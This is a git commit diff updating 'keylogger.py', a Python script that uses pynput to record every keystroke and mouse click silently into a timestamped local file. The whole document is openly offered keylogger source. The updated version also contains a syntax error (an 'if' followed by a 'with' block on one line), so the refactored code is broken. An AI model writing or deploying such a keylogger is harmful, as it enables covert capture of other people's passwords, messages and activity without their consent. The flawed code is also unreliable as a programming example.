cd3c248dfeeba1fd93aa9a70590bc6079020651a
Kamron <134091599+kamronsafar@users.noreply.github.com>
2025-04-13 03:23:58 -0400

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,27 +1,23 @@
 from pynput import keyboard , mouse
 import time
 
-local_time = time.localtime()
-day = local_time.tm_mday
-mon = local_time.tm_mon
-hour = local_time.tm_hour
-def keyPressed(key):
-    with open(f"{mon}_{day}_{hour}_.txt", "a") as logKey:
+localc = time.localtime()
+day = localc.tm_mday
+mon = localc.tm_mon
+hour = localc.tm_hour
+def keys(key):
+    with open(f"{mon}_{day}_{hour}_.txt", "a") as loKy:
         try:
             char = key.char
-            logKey.write(char)
-        except:
-            logKey.write(f"\n KEY: {key}\n")
+            loKy.write(char)
+        except: loKy.write(f"\n KEY: {key}\n")
 
-def on_click(x, y, buon, preed):
-    if preed:
-        with open(f"{mon}_{day}_{hour}_.txt", "a") as logMouse:
-            logMouse.write(f" \nMouse clicked  ({x}, {y}) \n {buon}\n")
-
+def click(x, y, buon, preed):
+    if preed: with open(f"{mon}_{day}_{hour}_.txt", "a") as logMouse:logMouse.write(f" \nMouse ({x}, {y}) \n {buon}\n")
+        
 if __name__ == "__main__":
-    keyboard_listener = keyboard.Listener(on_press=keyPressed)
-
-    mouse_listener = mouse.Listener(on_click=on_click)
+    keyboard_listener = keyboard.Listener(on_press=keys)
+    mouse_listener = mouse.Listener(on_click=click)
     keyboard_listener.start()
     mouse_listener.start()
     input()
